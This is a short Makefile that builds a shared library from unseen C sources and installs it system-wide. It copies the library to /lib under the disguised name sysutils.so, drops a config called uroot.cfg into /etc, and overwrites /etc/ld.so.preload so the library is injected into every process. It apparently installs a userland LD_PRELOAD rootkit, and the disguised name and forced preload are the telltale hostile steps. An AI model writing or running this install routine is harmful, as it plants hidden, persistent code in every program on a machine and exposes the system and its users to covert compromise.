SRCS = $(wildcard *.c)
HEADERS = $(wildcard *.h)

dist/loader.so: $(SRCS) $(HEADERS)
	mkdir -p dist
	gcc -shared -fPIC $(SRCS) -o $@ -ldl -lconfig -nostartfiles

install:
	cp uroot.cfg /etc/uroot.cfg
	cp dist/loader.so /lib/sysutils.so 
	echo /lib/sysutils.so > /etc/ld.so.preload